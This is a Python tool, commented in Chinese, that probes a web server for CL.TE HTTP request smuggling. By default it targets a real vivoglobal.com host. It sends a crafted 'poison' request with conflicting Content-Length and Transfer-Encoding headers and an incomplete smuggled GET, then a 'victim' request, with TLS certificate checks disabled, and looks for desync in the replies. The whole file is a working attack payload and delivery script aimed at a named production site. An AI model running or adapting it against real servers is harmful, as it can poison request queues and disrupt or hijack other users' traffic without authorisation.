import socket
import ssl
import time
from urllib.parse import urlparse

DEFAULT_TARGET = 'https://in-feedback.vivoglobal.com'
DEFAULT_PATH = '/'
TIMEOUT_CONNECT = 10
TIMEOUT_READ = 4

def parse_target(user_input):
    """解析用户输入的 URL，返回 (host, port, sni, hosthdr, path)"""
    url = user_input.strip() if user_input and user_input.strip() else DEFAULT_TARGET

    # 补全协议前缀
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)

    host = parsed.hostname
    if not host:
        raise ValueError(f'无法从输入中解析出主机名: {user_input!r}')

    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or DEFAULT_PATH
    if parsed.query:
        path += '?' + parsed.query

    hosthdr = parsed.netloc if ':' not in parsed.netloc or parsed.netloc.count(':') == 1 else host
    # 标准化 host header（去掉默认端口）
    if hosthdr.endswith(f':{port}') and ((port == 80 and parsed.scheme == 'http') or (port == 443 and parsed.scheme == 'https')):
        hosthdr = hosthdr.rsplit(':', 1)[0]

    use_tls = parsed.scheme == 'https'
    return host, port, host, hosthdr, path, use_tls

def build_poison(hosthdr, base_path):
    """构造 CL.TE 走私探测报文，尾部拼接不完整的 smuggled 请求"""
    smuggled = f'{base_path}nonexistent99999' if base_path.endswith('/') else f'{base_path}/nonexistent99999'

    poison = (
        "POST " + base_path + " HTTP/1.1\r\n"
        f'Host: {hosthdr}\r\n'
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 5\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"GET {smuggled} HTTP/1.1\r\n"
        f'Host: {hosthdr}\r\n'
        # deliberately no final \r\n\r\n
    )
    return poison

def build_victim(hosthdr, base_path):
    """构造 victim 请求"""
    victim = (
        f"GET {base_path} HTTP/1.1\r\n"
        f"Host: {hosthdr}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return victim

def send_probe(host, port, sni, hosthdr, base_path, use_tls=True):
    """执行单次 CL.TE 探测，返回原始响应字节"""
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)
        s = ctx.wrap_socket(raw, server_hostname=sni)
    else:
        s = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)

    s.settimeout(TIMEOUT_READ)

    poison = build_poison(hosthdr, base_path)
    victim = build_victim(hosthdr, base_path)

    try:
        s.sendall(poison.encode())
        time.sleep(0.5)
        s.sendall(victim.encode())

        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    finally:
        s.close()

    return poison, victim, data

def analyze_response(data, base_path):
    """简单分析响应是否存在 desync 迹象"""
    if not data:
        return 'NO_RESPONSE / TIMEOUT — 连接可能被挂起（可能是 desync 或后端阻塞）'

    text = data.decode(errors='replace')
    indicators = []

    # 检查是否存在第二个响应（404 对应 smuggled 请求）
    status_lines = [line for line in text.split('\r\n') if line.startswith('HTTP/')]
    if len(status_lines) >= 2:
        indicators.append(f'检测到 {len(status_lines)} 个 HTTP 响应 — 存在响应错位(misattribution)可能')

    if 'nonexistent99999' in text or '404' in text:
        indicators.append('smuggled 路径出现在响应中 — 确认 CL.TE desync')

    if '400' in text or '403' in text or '502' in text or '503' in text:
        indicators.append('收到异常状态码 — 前端/后端解析分歧的间接迹象')

    if not indicators:
        return '无异常 — 前后端解析一致或防护完善'
    return '; '.join(indicators)

def main():
    print('=== CL.TE HTTP Request Smuggling 探测工具 ===')
    user_input = input(f'输入目标 URL (直接回车使用默认 {DEFAULT_TARGET}): ').strip()

    try:
        host, port, sni, hosthdr, base_path, use_tls = parse_target(user_input)
    except ValueError as e:
        print(f'[!] 输入错误: {e}')
        return

    print(f'[*] 目标: {host}:{port}  TLS: {use_tls}  基准路径: {base_path}')
    print(f'[*] SNI: {sni}  Host头: {hosthdr}')
    print()

    try:
        poison, victim, data = send_probe(host, port, sni, hosthdr, base_path, use_tls)
    except (socket.error, OSError) as e:
        print(f'[!] 连接失败: {e}')
        return

    print('=== Poisoning payload (smuggled GET is INCOMPLETE) ===')
    print(repr(poison))
    print()
    print('=== Victim request ===')
    print(repr(victim))
    print()
    print('=== Raw response ===')
    print(data.decode(errors='replace'))
    print()
    print('=== 分析结论 ===')
    print(analyze_response(data, base_path))

if __name__ == '__main__':
    main()